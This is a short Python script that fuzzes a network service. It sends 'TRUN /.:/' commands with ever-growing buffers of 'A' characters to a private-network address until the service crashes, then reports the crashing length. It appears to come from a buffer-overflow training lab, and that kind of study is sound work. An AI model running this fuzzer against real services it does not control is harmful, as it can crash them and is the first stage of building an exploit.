#!/usr/bin/python
import sys
import socket
from time import sleep
# Python 2 version of this script

buffer = 'A' * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.0.10', 9999))
        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + 'A' * 100
    except Exception as e:
        print('Fuzzing crashed at %s bytes' % str(len(buffer)))
        sys.exit()